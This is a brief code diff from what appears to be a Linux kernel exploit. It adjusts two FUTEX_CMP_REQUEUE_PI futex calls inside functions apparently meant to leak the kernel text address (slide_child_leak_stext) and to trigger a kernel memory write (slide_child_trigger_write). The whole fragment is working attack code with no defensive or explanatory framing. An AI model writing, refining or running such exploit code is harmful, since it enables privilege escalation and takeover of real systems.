@@ -856,7 +856,7 @@ uint64_t slide_child_leak_stext(void) {
   while (requeue_polls < SLIDE_REQUEUE_MAX_POLLS) {
     requeue_polls++;
     errno = 0;
-    requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
+    requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)0,
                            &slide_f_pi_target, 0);
     requeue_errno = errno;
     if (requeue_ret != 0) {
@@ -923,7 +923,7 @@ static int slide_child_trigger_write(void) {
   while (requeue_polls < SLIDE_REQUEUE_MAX_POLLS) {
     requeue_polls++;
     errno = 0;
-    requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
+    requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)0,
                            &slide_f_pi_target, 0);
     requeue_errno = errno;
     if (requeue_ret != 0) {
